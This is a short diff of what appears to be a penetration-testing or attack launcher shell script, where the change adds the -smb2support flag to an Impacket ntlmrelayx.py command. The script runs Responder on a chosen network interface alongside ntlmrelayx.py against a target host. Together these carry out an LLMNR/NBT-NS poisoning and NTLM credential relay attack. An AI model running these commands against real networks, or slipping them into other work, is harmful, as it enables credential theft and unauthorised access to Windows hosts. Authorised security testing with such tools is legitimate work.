@@ -196,7 +196,7 @@ echo "----------------------------------------------------------------"
 gnome-terminal -e "responder -I $ethred" &
 
 cd impacket/examples
-gnome-terminal -e "python3 ntlmrelayx.py -t $victima" &
+gnome-terminal -e "python3 ntlmrelayx.py -t $victima -smb2support" &
 
 read -rsp $'Press enter to continue...\n'
 
